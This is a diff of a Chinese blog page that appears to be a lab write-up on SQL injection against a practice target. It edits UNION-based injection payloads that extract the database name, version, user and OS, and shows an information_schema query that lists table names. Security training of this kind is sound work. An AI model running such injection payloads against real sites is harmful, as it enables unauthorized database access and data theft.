@@ -578,16 +578,16 @@
 <p>**数据库名字：database( )**：mozhe_Discuz_StormGroup</p>
 <p>**数据库用户：user( )**：root@localhost</p>
 <p><strong>操作系统：@@version_compile_os</strong>：Linux</p>
-<p><code>219.153.49.228:47262/new_list.php?id=-1 union select 1,database(),version(),4</code></p>
+<p><code>?id=-1 union select 1,database(),version(),4</code></p>
 <img src="https://gitee.com/mie1732/emc/raw/master/img/202202282252697.png" alt="数据库名字，版本" style="zoom:67%;" />
 
-<p><code>219.153.49.228:47262/new_list.php?id=-1 union select 1,user(),@@version_compile_os,4</code></p>
+<p><code>?id=-1 union select 1,user(),@@version_compile_os,4</code></p>
 <img src="https://gitee.com/mie1732/emc/raw/master/img/202202282255698.png" alt="操作系统，数据库用户" style="zoom:67%;" />
 
 <ul>
 <li>查询</li>
 </ul>
-<p>因为数据库版本为 5.7.22-0ubuntu0.16.04.1（高版本），可用information_schema数据库查询</p>
+<p>因为数据库版本为 5.7.22-0ubuntu0.16.04.1（高版本）可用information_schema数据库查询</p>
 <p>查询information_schema.tables数据库下的表名信息：得到的是一个数据库的名字</p>
 <p><code>?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;mozhe_Discuz_StormGroup&#39;</code></p>
 <p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010113324.png" alt="image-20220228231803141"></p>
@@ -1015,7 +1015,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">13.4k</span>
+                        class="white-color">13.3k</span>
             
             
             
